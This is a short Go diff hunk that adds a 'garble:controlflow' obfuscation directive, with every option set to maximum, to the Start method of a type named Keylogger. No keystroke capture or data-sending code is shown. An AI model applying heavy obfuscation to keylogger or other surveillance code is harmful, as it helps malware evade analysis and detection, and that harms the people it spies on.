@@ -40,6 +40,7 @@ func New() *Keylogger {
 }
 
 func (k *Keylogger) Start() error {
+	//garble:controlflow block_splits=max junk_jumps=max flatten_passes=max
 	k.mu.Lock()
 	if k.running {
 		k.mu.Unlock()
